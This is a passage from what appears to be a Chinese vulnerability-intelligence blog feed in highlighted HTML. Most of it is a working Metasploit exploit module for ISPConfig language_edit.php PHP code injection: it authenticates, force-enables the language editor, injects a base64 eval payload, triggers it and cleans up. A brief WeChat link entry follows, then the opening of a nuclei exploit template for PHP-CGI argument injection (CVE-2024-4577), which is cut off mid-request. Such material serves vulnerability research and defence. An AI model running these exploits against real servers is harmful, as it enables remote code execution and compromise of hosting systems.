=&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;help&#x27;</span>, <span class="hljs-string">&#x27;version.php&#x27;</span>),<br>          <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>        &#125;)<br>        <span class="hljs-keyword">if</span> settings_res<br>          doc = settings_res.get_html_document<br>          <span class="hljs-comment"># Try to find version in a span, div, or similar element</span><br>          version_element = doc.at(<span class="hljs-string">&#x27;//p[@class=&quot;frmTextHead&quot;]&#x27;</span>)<br>          <span class="hljs-keyword">if</span> version_element<br>            version_text = version_element.text<br>            version = version_text.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>].gsub(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>            version = <span class="hljs-title class_">Rex::Version</span>.new(version)<br>            <span class="hljs-keyword">if</span> version &lt; <span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-string">&#x27;3.2.11p1&#x27;</span>)<br>              print_good(<span class="hljs-string">&quot;ISPConfig version detected: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>              <span class="hljs-variable">@authenticated</span> = <span class="hljs-literal">true</span><br>              <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Vulnerable</span>(<span class="hljs-string">&quot;Version: <span class="hljs-subst">#&#123;version_text&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">end</span><br>          <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">authenticate</span><br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">302</span><br>      res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>         <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>,res&amp;.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,<span class="hljs-literal">nil</span>))<br>      &#125;)<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">if</span> res.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,<span class="hljs-literal">nil</span>)&amp;.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;admin&#x27;</span>) |<span class="hljs-params"></span>|<br>       res.body.downcase.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">end</span><br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_langedit_permission</span><br>    print_status(<span class="hljs-string">&#x27;Checking if admin_allow_langedit is enabled...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Try to access the language editor to see if it&#x27;s accessible</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span> &amp;&amp; res.body.<span class="hljs-keyword">include</span>?(<span class="hljs-string">&#x27;language_edit&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Language editor is accessible - admin_allow_langedit appears to be enabled&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">elsif</span> res &amp;&amp; res.code == <span class="hljs-number">403</span><br>      print_warning(<span class="hljs-string">&#x27;Language editor access denied - admin_allow_langedit may be disabled&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Could not determine language editor accessibility&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">enable_langedit_permission</span><br>    print_status(<span class="hljs-string">&#x27;Attempting to enable admin_allow_langedit...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Try to access the system settings page</span><br>    settings_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;system_config.php&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; settings_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">unless</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_warning(<span class="hljs-string">&#x27;Could not access system configuration page&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    <br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      print_warning(<span class="hljs-string">&#x27;Could not extract CSRF tokens from system config page&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    <br>    <span class="hljs-comment"># Try to enable the setting</span><br>    enable_data = &#123;<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;admin_allow_langedit&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>      <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;save&#x27;</span><br>    &#125;<br>    <br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; settings_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; enable_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;Successfully enabled admin_allow_langedit&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Failed to enable admin_allow_langedit&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">inject_payload</span><br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    <span class="hljs-variable">@payload_file</span> = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;<span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    b64_payload = <span class="hljs-title class_">Base64</span>.strict_encode64(payload.encoded)<br>    injection = <span class="hljs-string">&quot;&#x27;];eval(base64_decode(&#x27;<span class="hljs-subst">#&#123;b64_payload&#125;</span>&#x27;));die;#&quot;</span><br>    lang_file = <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0</span>..<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0</span>..<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">@payload_file</span>)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_file</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_payload</span>(<span class="hljs-params">payload_url</span>)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    <span class="hljs-comment"># Small delay to ensure the file is written</span><br>    sleep(<span class="hljs-number">1</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; payload_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;PHP payload triggered successfully&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Payload trigger response was unexpected&#x27;</span>)<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> <span class="hljs-variable">@payload_file</span><br>    print_status(<span class="hljs-string">&#x27;Cleaning up payload file...&#x27;</span>)<br>    <span class="hljs-comment"># Use the same vulnerability to delete the file</span><br>    injection = <span class="hljs-string">&quot;&#x27;];unlink(&#x27;<span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_file</span>&#125;</span>&#x27;);die;#&quot;</span><br>    lang_file = <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> res<br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    print_good(<span class="hljs-string">&quot;Payload file <span class="hljs-subst">#&#123;<span class="hljs-variable">@payload_file</span>&#125;</span> cleaned up&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    <span class="hljs-keyword">unless</span> <span class="hljs-variable">@authenticated</span><br>      authenticate<br>      <span class="hljs-variable">@authenticated</span> = <span class="hljs-literal">true</span><br>    <span class="hljs-keyword">end</span><br>    <br>    <span class="hljs-comment"># Check if language editor permissions are enabled</span><br>    <span class="hljs-keyword">unless</span> check_langedit_permission<br>      print_warning(<span class="hljs-string">&#x27;admin_allow_langedit appears to be disabled&#x27;</span>)<br>      print_status(<span class="hljs-string">&#x27;Attempting to enable admin_allow_langedit...&#x27;</span>)<br>      <br>      <span class="hljs-keyword">if</span> enable_langedit_permission<br>        print_good(<span class="hljs-string">&#x27;Successfully enabled admin_allow_langedit, retrying exploit...&#x27;</span>)<br>        <span class="hljs-comment"># Re-check permissions after enabling</span><br>        <span class="hljs-keyword">unless</span> check_langedit_permission<br>          fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Failed to enable admin_allow_langedit or language editor still not accessible&#x27;</span>)<br>        <span class="hljs-keyword">end</span><br>      <span class="hljs-keyword">else</span><br>        fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&#x27;Could not enable admin_allow_langedit - exploit requires this setting to be enabled&#x27;</span>)<br>      <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">end</span><br>    <br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入&lt;/p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>【图一乐】证监会修改了自己的 logo,股民有望解套？</title>
    <link href="http://example.com/2025/06/30/weixin_4015669588/"/>
    <id>http://example.com/2025/06/30/weixin_4015669588/</id>
    <published>2025-06-30T08:49:58.058Z</published>
    <updated>2025-06-30T08:49:58.055Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/HyN6q1KphAz6dhOXNAkPKQ">https://mp.weixin.qq.com/s/HyN6q1KphAz6dhOXNAkPKQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 独眼情报&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/HyN6q1KphAz6dhOXNAkPKQ&quot;&gt;https://mp.weixin.qq.c</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="独眼情报" scheme="http://example.com/tags/%E7%8B%AC%E7%9C%BC%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>PHP CGI 参数注入远程代码执行漏洞</title>
    <link href="http://example.com/2025/06/30/github_2417608249/"/>
    <id>http://example.com/2025/06/30/github_2417608249/</id>
    <published>2025-06-30T08:30:28.047Z</published>
    <updated>2025-06-30T08:30:28.043Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> PHP CGI 参数注入远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-4577</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> PHP的CGI实现中存在一个严重漏洞，允许远程攻击者通过命令注入执行任意代码。该漏洞存在于PHP CGI中对命令行参数的处理不当，可被利用来绕过安全限制并以Web服务器的权限执行任意命令。此漏洞影响所有8.3.4、8.2.17和8.1.27之前的PHP版本。</p><p><strong>产品厂商：</strong> PHP</p><p><strong>产品名称：</strong> PHP</p><p><strong>影响版本：</strong> version &lt; 8.3.4, version &lt; 8.2.17, version &lt; 8.1.27</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/511455fc4ca41cfd0b9782c7def51d47b4fa58ec/CVE-2024-4577.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/511455fc4ca41cfd0b9782c7def51d47b4fa58ec/CVE-2024-4577.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">4577</span><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> PHP CGI Argument Injection RCE<br>  <span class="hljs-params">author:</span> gaurang<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    A critical vulnerability <span class="hljs-keyword">in</span> PHP&#x27;s CGI implementation allows remote attackers to execute <br>    arbitrary code through command injection. The vulnerability exists due to improper handling <br>    of command-line arguments <span class="hljs-keyword">in</span> PHP CGI, which can be exploited to bypass security restrictions <br>    and execute arbitrary commands <span class="hljs-keyword">with</span> the privileges of the web server. This vulnerability <br>    affects all PHP versions before <span class="hljs-number">8.3</span>.<span class="hljs-number">4</span>, <span class="hljs-number">8.2</span>.<span class="hljs-number">17</span>, and <span class="hljs-number">8.1</span>.<span class="hljs-number">27</span>.<br>    <span class="hljs-params">References:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/cve-2024-4577</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.tarlogic.com<span class="hljs-operator">/</span>blog<span class="hljs-operator">/</span>cve-<span class="hljs-number">202</span>4-<span class="hljs-number">457</span>7-critical-vulnerability-php<span class="hljs-symbol">/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//learn.microsoft.com/en-us/answers/questions/1725847/php-8-3-vulnerability-cve-2024-4577</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.stormshield.com<span class="hljs-operator">/</span>news<span class="hljs-operator">/</span>security-alert-php-cve-<span class="hljs-number">202</span>4-<span class="hljs-number">457</span>7-stormshields-product-response<span class="hljs-symbol">/</span><br>  <span class="hljs-params">tags:</span> cve,rce,exploit,php<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>php-cgi<span class="hljs-operator">/</span>php-cgi.exe<span class="hljs-operator">?</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>cgi.force_redirect<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>cgi.redirect_status_env<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>fastcgi.impersonate<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>auto_prepend_file<span class="hljs-operator">=</span>php:<span class="hljs-operator">//</span>input<span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>allow_url_include<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-operator">-</span>d%<span class="hljs-number">20</span>allow_url_fopen<span class="hljs-operator">=</span><span class="hljs-number">1</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br>        <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) 